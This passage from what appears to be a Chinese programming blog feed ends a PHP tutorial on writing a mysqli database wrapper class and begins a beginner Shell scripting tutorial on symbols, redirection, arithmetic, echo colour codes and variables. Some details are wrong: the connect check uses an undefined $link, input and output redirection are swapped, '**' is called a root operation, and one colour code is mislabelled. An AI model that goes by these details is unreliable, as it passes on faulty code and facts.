<li>由于sql_connect方法中得到的连接对象mysqli的$link是一个局部变量，无法在其他方法里使用，因此需要将连接对象$link提升为整个类的内部可用：提升为属性</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在Sql类中增加属性，保存对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$link</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//修改sql_connect方法，使用属性保存连接对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sql_connect</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;link = @<span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;host,<span class="keyword">$this</span>-&gt;user,<span class="keyword">$this</span>-&gt;pass,<span class="keyword">$this</span>-&gt;dbname,<span class="keyword">$this</span>-&gt;port);</span><br><span class="line">    <span class="comment">//判定连接是否成功</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$link</span>-&gt;connect_error)&#123;</span><br><span class="line">        <span class="comment">//注意：连接资源保存在$this-&gt;link中，所以访问mysqli对象成员时需要$this-&gt;link-&gt;属性/方法()</span></span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Connect Error (&#x27;</span>  .  <span class="keyword">$this</span>-&gt;link-&gt;connect_errno  .  <span class="string">&#x27;) &#x27;</span> .  <span class="keyword">$this</span>-&gt;link-&gt;connect_error);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="10">
<li>继续完成设定字符集的功能：使用属性保存的mysqli连接对象</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在Sql类中完善设定字符集的方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sql_charset</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;set names <span class="subst">&#123;$this-&gt;charset&#125;</span>&quot;</span>;		<span class="comment">//组织SQL指令</span></span><br><span class="line">    <span class="comment">//调用mysqli::query</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;link-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="11">
<li>设置字符集的SQL指令虽然简单，但是因为有数据来源于外部，所以存在出错的风险，因此需要进行SQL错误判定</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在Sql类中完善设定字符集的方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sql_charset</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;set names <span class="subst">&#123;$this-&gt;charset&#125;</span>&quot;</span>;		<span class="comment">//组织SQL指令</span></span><br><span class="line">   </span><br><span class="line">    <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;link-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="comment">//失败发挥false</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Charset Error(&#x27;</span> . <span class="keyword">$this</span>-&gt;link-&gt;errno . <span class="string">&#x27;) &#x27;</span> . <span class="keyword">$this</span>-&gt;link-&gt;error);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="12">
<li>同样的，字符集的设置也是为了操作数据库的前置条件，属于初始化的一部分。因此需要字符集设置的方法在构造方法中调用，方便用户操作</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在Sql类的构造方法中调用字符集设置方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$info</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//在连接数据库方法调用之后调用设置字符集方法</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;sql_charset();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="13">
<li>至此：数据库的初始化操作已经完成，此时要考虑的事情是用户调用数据库类是为了干什么？为了执行SQL指令，也就是增删改查。在mysqli中所有的SQL执行都是通过mysqli::query()方法执行，但是我们可以根据需求封装两个函数：写方法和查方法（包含一条和多条查询）</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在Sql类中增加一个写方法：SQL指令来自于调用处提供</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sql_exec</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//当前不知道SQL指令是什么样的，只是负责执行，所以由外部提供</span></span><br><span class="line">    <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;link-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="comment">//判断SQL有没有语法错误</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Sql Error(&#x27;</span> . <span class="keyword">$this</span>-&gt;link-&gt;errno . <span class="string">&#x27;) &#x27;</span> . <span class="keyword">$this</span>-&gt;link-&gt;error);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//返回执行结果</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$res</span>;		<span class="comment">//本质就是一个true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在Sql类中增加一个读方法：Sql指令来自于调用处提供，同时设定参数供用户选择一条或全部结果</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sql_query</span>(<span class="params"><span class="variable">$sql</span>,<span class="variable">$all</span> = <span class="literal">false</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//$all代表是否获取多条记录，默认false只获取一条记录</span></span><br><span class="line">    <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;link-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="comment">//判断SQL有没有语法错误</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Sql Error(&#x27;</span> . <span class="keyword">$this</span>-&gt;link-&gt;errno . <span class="string">&#x27;) &#x27;</span> . <span class="keyword">$this</span>-&gt;link-&gt;error);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//解析其中的结果：根据用户需求获取一条或者多条记录</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$all</span>)&#123;</span><br><span class="line">        <span class="comment">//获取全部：mysqli_result::fetch_all(MYSQLI_ASSOC)表示返回关联数组（默认是索引）</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>-&gt;fetch_all(MYSQLI_ASSOC);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//获取一条：mysqli_result::fetch_assoc()</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>-&gt;fetch_assoc();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="14">
<li>上述已经完成了数据库类要实现的基本功能：实现SQL指令的执行和结果返回，但是从功能细节的角度出发还需要进行完善：插入操作后要获取自增长id，更新和删除操作受影响的行数，查询操作中记录数量。这种使用可以通过设置方法来实现获取（自增长id），也可以通过增加属性来实现（属性简单）</li>
</ol>
<p>增加属性：受影响的行数，自增长id，查询记录数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在Sql类中追加属性</span></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$affected_rows</span>;	<span class="comment">//受影响行数（上次操作）</span></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$num_rows</span>;		<span class="comment">//查询结果记录数（上次操作）</span></span><br></pre></td></tr></table></figure>
<p>在写操作sql_exec中，为受影响行数赋值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//修改sql_exec方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sql_exec</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;link-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="comment">//判断SQL有没有语法错误</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Sql Error(&#x27;</span> . <span class="keyword">$this</span>-&gt;link-&gt;errno . <span class="string">&#x27;) &#x27;</span> . <span class="keyword">$this</span>-&gt;link-&gt;error);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//成功保存受影响的行数：数据在mysqli对象中</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;affected_rows = <span class="keyword">$this</span>-&gt;link-&gt;affected_rows;</span><br><span class="line">    <span class="comment">//返回执行结果</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$res</span>;		<span class="comment">//本质就是一个true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在读操作中，为记录数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//修改sql_query方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sql_query</span>(<span class="params"><span class="variable">$sql</span>,<span class="variable">$all</span> = <span class="literal">false</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;link-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="comment">//判断SQL有没有语法错误</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Sql Error(&#x27;</span> . <span class="keyword">$this</span>-&gt;link-&gt;errno . <span class="string">&#x27;) &#x27;</span> . <span class="keyword">$this</span>-&gt;link-&gt;error);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//获取记录信息：数据在mysqli_result对象中</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;num_rows = <span class="variable">$res</span>-&gt;num_rows;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//解析其中的结果：根据用户需求获取一条或者多条记录</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$all</span>)&#123;</span><br><span class="line">        <span class="comment">//获取全部：mysqli_result::fetch_all(MYSQLI_ASSOC)表示返回关联数组（默认是索引）</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>-&gt;fetch_all(MYSQLI_ASSOC);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//获取一条：mysqli_result::fetch_assoc()</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>-&gt;fetch_assoc();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>增加一个方法专门获取上次插入数据的自增长ID（因为这个是人为区分，不方便放到sql_exec中）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在Sql类中增加一个方法获取上一次自增长操作id</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sql_insert_id</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//insertid是在mysqli对象执行query方法时获得</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;link-&gt;insert_id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="15">
<li>至此：数据库类的功能已经实现，接下来要考虑类的定义规范：类对成员的控制性</li>
</ol>
<ul>
<li>属性如果不需要给外部访问，私有</li>
<li>方法如果只是内部调用，私有</li>
</ul>
<ol start="16">
<li>利用数据库类实现数据库的写操作和读操作</li>
</ol>
<blockquote>
<p><strong>总结</strong></p>
</blockquote>
<ol>
<li>类的封装是以功能驱动为前提，相关操作存放到一个类中</li>
<li>一个类通常是一个独立的文件，文件名与类名相同（方便后期维护和自动加载）</li>
<li>类中如果有数据需要管理，设定属性（固定数据可以使用类常量）</li>
<li>类中如果有功能需要实现（数据加工），设定方法</li>
<li>一个功能通常使用一个方法实现，方法的颗粒度应该尽可能小（方便复用）</li>
<li>应该尽可能增加类对成员的控制：即能私有尽可能私有</li>
</ol>
]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>Shell脚本</title>
    <url>/2021/01/29/Shell%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<h2 id="一、shell介绍"><a href="#一、shell介绍" class="headerlink" title="一、shell介绍"></a>一、shell介绍</h2><ul>
<li>什么是shell</li>
<li>shell功能</li>
</ul>
<hr>
<h3 id="1-什么是shell"><a href="#1-什么是shell" class="headerlink" title="1.什么是shell"></a>1.什么是shell</h3><p>shell是一个程序，采用C语言编写，是用户和Linux内核沟通的桥梁。它既是一种命令语言，又是一种解释性的编程语言。通过一个图标来查看以下设立了的作用</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/00_shell%E4%BB%8B%E7%BB%8D.png"></p>
<blockquote>
<p><strong>扩展知识</strong></p>
<p>kernel（内核）：为软件服务，接收用户或软件指令驱动硬件，完成工作；</p>
<p>shell：命令解释器</p>
<p>user：用户接口，对接用户</p>
</blockquote>
<p>从上图可以看出，shell在操作系统中起到了承接用户和系统内核的作用。那为什么步直接用户对内核呢？</p>
<p>原因很简单，因为内核处理的都是二进制，而用户处理的都是高级语言。简而言之，如果没有shell，你希望告诉你喜欢的妹子：我爱你。你需要经过以下步骤：</p>
<ol>
<li>将“我爱你”翻译成二进制</li>
<li>告诉内核</li>
<li>内核通过网卡发送给你的妹子</li>
<li>妹子计算机网卡收到你发的二进制</li>
<li>网卡交给内核</li>
<li>内核交给妹子</li>
<li>妹子看到都是一串01组成的数字，o my god，二进制不是人人都懂的，你的表白也就石沉大海了。</li>
</ol>
<p>为了让所有人都能够快速、方便地使用计算机，我们打的系统开发人员通过shell解决了这个问题。使任何一个希望通过计算机来工作、娱乐的人都能够快速操作计算机。</p>
<h3 id="2-shell功能"><a href="#2-shell功能" class="headerlink" title="2. shell功能"></a>2. shell功能</h3><ul>
<li>命令行解释功能</li>
<li>启动程序</li>
<li>输入输出重定向</li>
<li>管道连接</li>
<li>文件名置换(echo /*)</li>
<li>变量维护</li>
<li>环境控制</li>
<li>shell编程</li>
</ul>
<h2 id="二、shell语法"><a href="#二、shell语法" class="headerlink" title="二、shell语法"></a>二、shell语法</h2><ul>
<li>如何书写一个shell脚本</li>
<li>shell脚本运行</li>
<li>shell中的特殊符号</li>
<li>管道</li>
<li>重定向</li>
<li>shell中数学运算</li>
<li>脚本退出</li>
</ul>
<hr>
<p>**shell脚本就是将完成一个任务的所有命令按照执行的先后顺序，自上而下写入到一个文本文件中，然后给予执行权限。</p>
<h3 id="1-如何书写一个shell脚本"><a href="#1-如何书写一个shell脚本" class="headerlink" title="1.如何书写一个shell脚本"></a>1.如何书写一个shell脚本</h3><p>shell脚本的命名：</p>
<p>名字要有意义，最好不要用a、b、c、d、1、2、3、4这中方式命名；虽然在linux系统中，文件没有扩展名的概念，依然建议你用.sh结尾；名字不要太长，最好能在30个字节以内解决。例如check_memory.sh</p>
<p>shell脚本格式：</p>
<p>shell脚本开头必须指定脚本运行环境，以<code>#!</code>这个特殊符号组合了组成。如： #!/bin/bash 指定该脚本是运行解析由/bin/bash来完成的：</p>
<p>shell中的注释使用<code>#</code>号</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shell脚本中，最好加入脚本说明字段</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Author: xxx</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Created Time: xxxx/xx/xx xx:xx</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Release:1.0</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Script Description: first shell study script</span></span><br></pre></td></tr></table></figure>


<h3 id="2-如何运行一个shell脚本"><a href="#2-如何运行一个shell脚本" class="headerlink" title="2.如何运行一个shell脚本"></a>2.如何运行一个shell脚本</h3><p>脚本运行需要执行权限，当我们给一个文件赋予执行权限后，该脚本就可以运行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod u+x filename</span><br></pre></td></tr></table></figure>
<p>如果不希望赋予脚本执行权限，那么可以使用bash命令来运行未给予执行权限的脚本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash filename</span><br></pre></td></tr></table></figure>


<h3 id="3-shell中的特殊符号"><a href="#3-shell中的特殊符号" class="headerlink" title="3. shell中的特殊符号"></a>3. shell中的特殊符号</h3><table>
<thead>
<tr>
<th align="center">符号</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">~</td>
<td>家目录        # cd ~ 代表进入用户家目录</td>
</tr>
<tr>
<td align="center">!</td>
<td>执行历史命令            ~~执行上一条命令</td>
</tr>
<tr>
<td align="center">$</td>
<td>变量中取内容符</td>
</tr>
<tr>
<td align="center">+ - * / %</td>
<td>对应数学运算    加 减 乘 除 取余</td>
</tr>
<tr>
<td align="center">&amp;</td>
<td>后台执行</td>
</tr>
<tr>
<td align="center">*</td>
<td>型号是shell中的通配符，匹配所有</td>
</tr>
<tr>
<td align="center">?</td>
<td>问号是shell中的通配符，匹配除回车以外的一个字符</td>
</tr>
<tr>
<td align="center">;</td>
<td>分号可以在shell中一行执行多个命令，命令hi加用分号分隔</td>
</tr>
<tr>
<td align="center">|</td>
<td>管道符，上一个命令的输出作为下一个命令的输入    cat filename | grep “abc”</td>
</tr>
<tr>
<td align="center">\</td>
<td>转义字符</td>
</tr>
<tr>
<td align="center">``</td>
<td>反引号 命令中执行命令        echo “today is /<code>date +%F/</code>”</td>
</tr>
<tr>
<td align="center">‘ ‘</td>
<td>单引号，脚本中字符串要用单引号引起来，但不同于双引号的是，单引号不解释变量</td>
</tr>
<tr>
<td align="center">“ “</td>
<td>双引号，脚本中出现的字符串可以用双引号引起来</td>
</tr>
</tbody></table>
<h3 id="4-shell中管道的运用"><a href="#4-shell中管道的运用" class="headerlink" title="4. shell中管道的运用"></a>4. shell中管道的运用</h3><p>|  管道符在shell中使用是最多的，很多组合命令都需要通过组合命令来完成输出。管道符其实就是下一个命令对上一个命令的输出做处理。</p>
<h3 id="5-shell重定向"><a href="#5-shell重定向" class="headerlink" title="5. shell重定向"></a>5. shell重定向</h3><ol>
<li>&gt;    重定向输入  覆盖原数据</li>
<li>&gt;&gt;  重定向追加输入，在原数据的末尾添加</li>
<li>&lt;    重定向输出     wc -l &lt; /etc/passwd</li>
<li>&lt;&lt;  重定向追加输出  fdisk /dev/sdb &lt;</li>
</ol>
<h3 id="6-shell数学运算"><a href="#6-shell数学运算" class="headerlink" title="6. shell数学运算"></a>6. shell数学运算</h3><p>expr 命令：只能做整数运算，格式比较古板，注意空格</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">expr 1 + 1</span><br><span class="line">expr 5 - 2</span><br><span class="line">expr 5 \* 2</span><br><span class="line">expr 5 / 2</span><br><span class="line">expr 5 % 2</span><br></pre></td></tr></table></figure>
<p>使用bc计算器处理浮点运算，sacle=2代表小数点保留两位</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;scale=2;3+100&quot;|bc</span><br><span class="line">echo &quot;scale=2;100-3&quot;|bc</span><br><span class="line">echo &quot;scale=2;100/3&quot;|bc</span><br><span class="line">echo &quot;scale=2;100*3&quot;|bc</span><br></pre></td></tr></table></figure>
<p>双小圆括号运算，在shell中(())也可以用来做数学运算</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> $(( <span class="number">100</span>+<span class="number">3</span>))</span><br><span class="line"><span class="keyword">echo</span> $(( <span class="number">100</span><span class="number">-3</span>)) </span><br><span class="line"><span class="keyword">echo</span> $(( <span class="number">100</span>%<span class="number">3</span>))</span><br><span class="line"><span class="keyword">echo</span> $(( <span class="number">100</span>*<span class="number">3</span>))</span><br><span class="line"><span class="keyword">echo</span> $(( <span class="number">100</span>/<span class="number">3</span>))</span><br><span class="line"><span class="keyword">echo</span> $(( <span class="number">100</span>**<span class="number">3</span>))		<span class="comment">//开方运算    </span></span><br></pre></td></tr></table></figure>


<h3 id="7-退出脚本"><a href="#7-退出脚本" class="headerlink" title="7.退出脚本"></a>7.退出脚本</h3><p>exit NUM：退出脚本，释放系统资源，NUM代表一个整数，代表返回值。</p>
<h2 id="三、shell格式化输出"><a href="#三、shell格式化输出" class="headerlink" title="三、shell格式化输出"></a>三、shell格式化输出</h2><ul>
<li>echo命令</li>
<li>颜色输出</li>
</ul>
<hr>
<p><strong>一个程序需要有0个或以上输入，一个或更多输出</strong></p>
<h3 id="1-echo命令介绍"><a href="#1-echo命令介绍" class="headerlink" title="1. echo命令介绍"></a>1. echo命令介绍</h3><p>echo命令的功能是在显示器上显示一段文字，一般起到一个提示的作用。 该命令的一般格式为:echo [ -n ]字符串</p>
<p>其中选项n表示输出文字后不换行;字符串能加引号，也能不加引号。用echo命令输出加引号的字符串时，将字符串原样输出;用echo命令输出不加引号的字符串时，将字符串中的各个单词作为字符串输出，各字符串之间用一个空格分割。</p>
<p>功能说明:显示文字。</p>
<p>语法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo [-ne][字符串]	</span><br><span class="line">echo [--help][--version] </span><br></pre></td></tr></table></figure>
<p>补充说明：echo会将输入的字符串送往标准输出。输出的字符串间以空白字符隔开,并在最后加上换行号。</p>
<p>命令选项：</p>
<p>-n：不要在最后自动换行；</p>
<p>-e：若字符串中出现以下字符，则特别加以处理，而不会将它当成一般文字输出:</p>
<p>​    转义字符：</p>
<table>
<thead>
<tr>
<th align="center">转义字符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">\a</td>
<td>发出警告声</td>
</tr>
<tr>
<td align="center">\b</td>
<td>删除前一个字符</td>
</tr>
<tr>
<td align="center">\c</td>
<td>最后不加上换行符号</td>
</tr>
<tr>
<td align="center">\f</td>
<td>换行但光标仍旧停留在原来的位置</td>
</tr>
<tr>
<td align="center">\n</td>
<td>换行且光标移至行首</td>
</tr>
<tr>
<td align="center">\r</td>
<td>光标移至行首，但不换行</td>
</tr>
<tr>
<td align="center">\t</td>
<td>插入tab</td>
</tr>
<tr>
<td align="center">\v</td>
<td>与\f相同</td>
</tr>
<tr>
<td align="center">\\</td>
<td>插入\字符</td>
</tr>
<tr>
<td align="center">\nnn</td>
<td>插入nnn(八进制)所代表的ASCII字符</td>
</tr>
</tbody></table>
<p>举例：输出一个菜单</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">echo -e &quot;\t\t\t\tFruit Shop&quot;</span><br><span class="line">echo -e &quot;\t1) Apple&quot;</span><br><span class="line">echo -e &quot;\t2) Orange&quot;</span><br><span class="line">echo -e &quot;\t3) Banana&quot;</span><br></pre></td></tr></table></figure>
<p>输出</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">			Fruit Shop</span><br><span class="line">1) Apple</span><br><span class="line">2) Orange</span><br><span class="line">3) Banana</span><br></pre></td></tr></table></figure>


<h3 id="2-颜色代码"><a href="#2-颜色代码" class="headerlink" title="2.颜色代码"></a>2.颜色代码</h3><p>脚本中echo显示内容带颜色显示,echo显示带颜色，需要使用参数-e</p>
<p>格式如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo -e “\033[字背景颜色；文字颜色m字符串\033[0m”</span><br></pre></td></tr></table></figure>
<p>例如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo -e “\033[41;36m something here \033[0m”</span><br></pre></td></tr></table></figure>
<ol>
<li><p>字背景颜色和文字颜色之间是英文的””</p>
</li>
<li><p>文字颜色后面有个m</p>
</li>
<li><p>字符串前后可以没有空格，如果有的话，输出也是同样有空格</p>
</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">下面是相应的字和背景颜色，可以自己来尝试找出不同颜色搭配</span><br><span class="line">　　例</span><br><span class="line">　　echo -e “\033[31m 红色字 \033[0m”</span><br><span class="line">　　echo -e “\033[34m 黄色字 \033[0m”</span><br><span class="line">　　echo -e “\033[41;33m 红底黄字 \033[0m”</span><br><span class="line">　　echo -e “\033[41;37m 红底白字 \033[0m”</span><br><span class="line">　　</span><br><span class="line">字颜色：30—–37</span><br><span class="line">　　echo -e “\033[30m 黑色字 \033[0m”</span><br><span class="line">　　echo -e “\033[31m 红色字 \033[0m”</span><br><span class="line">　　echo -e “\033[32m 绿色字 \033[0m”</span><br><span class="line">　　echo -e “\033[33m 黄色字 \033[0m”</span><br><span class="line">　　echo -e “\033[34m 蓝色字 \033[0m”</span><br><span class="line">　　echo -e “\033[35m 紫色字 \033[0m”</span><br><span class="line">　　echo -e “\033[36m 天蓝字 \033[0m”</span><br><span class="line">　　echo -e “\033[37m 白色字 \033[0m”</span><br><span class="line">　　</span><br><span class="line">字背景颜色范围：40—–47</span><br><span class="line">　　echo -e “\033[40;37m 黑底白字 \033[0m”</span><br><span class="line">　　echo -e “\033[41;37m 红底白字 \033[0m”</span><br><span class="line">　　echo -e “\033[42;37m 绿底白字 \033[0m”</span><br><span class="line">　　echo -e “\033[43;37m 黄底白字 \033[0m”</span><br><span class="line">　　echo -e “\033[44;37m 蓝底白字 \033[0m”</span><br><span class="line">　　echo -e “\033[45;37m 紫底白字 \033[0m”</span><br><span class="line">　　echo -e “\033[46;37m 天蓝底白字 \033[0m”</span><br><span class="line">　　echo -e “\033[47;30m 白底黑字 \033[0m”</span><br><span class="line">　　</span><br><span class="line">最后面控制选项说明</span><br><span class="line">　　\033[0m 关闭所有属性</span><br><span class="line">　　\033[1m 设置高亮度</span><br><span class="line">　　\033[4m 下划线</span><br><span class="line">　　\033[5m 闪烁</span><br><span class="line">　　\033[7m 反显</span><br><span class="line">　　\033[8m 消隐</span><br><span class="line">　　\033[30m — \33[37m </span><br><span class="line">设置前景色</span><br><span class="line">　　\033[40m — \33[47m 设置背景色</span><br><span class="line">　　\033[nA 光标上移n行</span><br><span class="line">　　\033[nB 光标下移n行</span><br><span class="line">　　\033[nC 光标右移n行</span><br><span class="line">　　\033[nD 光标左移n行</span><br><span class="line">　　\033[y;xH设置光标位置</span><br><span class="line">　　\033[2J 清屏</span><br><span class="line">　　\033[K 清除从光标到行尾的内容</span><br><span class="line">　　\33[s 保存光标位置</span><br><span class="line">　　\033[u 恢复光标位置</span><br><span class="line">　　\033[?25l 隐藏光标</span><br><span class="line">　　\033[?25h 显示光标</span><br></pre></td></tr></table></figure>


<h2 id="四、shell基本输入"><a href="#四、shell基本输入" class="headerlink" title="四、shell基本输入"></a>四、shell基本输入</h2><ul>
<li>read命令</li>
</ul>
<hr>
<h3 id="1-read命令"><a href="#1-read命令" class="headerlink" title="1. read命令"></a>1. read命令</h3><p>默认接受键盘的输入，回车符代表输入结束</p>
<table>
<thead>
<tr>
<th align="center">read 命令选项</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">-p</td>
<td>打印信息</td>
</tr>
<tr>
<td align="center">-t</td>
<td>限定时间</td>
</tr>
<tr>
<td align="center">-s</td>
<td>不回显</td>
</tr>
<tr>
<td align="center">-n</td>
<td>输入字符个数</td>
</tr>
</tbody></table>
<h2 id="五、shell变量"><a href="#五、shell变量" class="headerlink" title="五、shell变量"></a>五、shell变量</h2><ul>
<li>变量介绍</li>
<li>变量分类</li>
<li>变量管理</li>
</ul>
<hr>
<h3 id="1-变量介绍"><a href="#1-变量介绍" class="headerlink" title="1.变量介绍"></a>1.变量介绍</h3><ol>
<li> 在编程中，我们总有一些数据需要临时存放在内存，以待后续使用时快速读出。内存在系统启动的时候被按照1B一个单位划分为若干个块，然后统一</li>
<li> 编号(16进制编号)，并对内存的使用情况做记录，保存在内存跟踪表中。</li>
</ol>
<p>变量：变量是编程中最常用的一种临时在内存中存取数据的一种方式。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/kcxvft.png" alt="img"></p>
<p>从图片可以看出，当我们在脚本中定义变量存值的时候，可以从以下方面看到变化：</p>
<ol>
<li><p>内存占用：如果存的是一个字符则占用1个字节，如果存的是字符串则是字符串的长度加1个字节长度(\0是一个特殊字符，代表字符串结束)。</p>
</li>
<li><p>变量名与内存空间关系：计算机中会将对应的内存空间和变量名称绑定在一起，此时代表这段内存空间已经被程序占用，其他程序不可复用；然后将变量名对应的值存在对应内存地址的空间里。</p>
</li>
</ol>
<h3 id="2-变量分类"><a href="#2-变量分类" class="headerlink" title="2.变量分类"></a>2.变量分类</h3><ol>
<li>本地变量：用户私有变量，只有本用户可以使用，保存在家目录下的.bash_profile、.bashrc文件中</li>
<li>全局变量：所有用户都可以使用，保存在/etc/profile、/etc/bashrc文件中</li>
<li>用户自定义变量：用户自定义，比如脚本中的变量</li>
</ol>
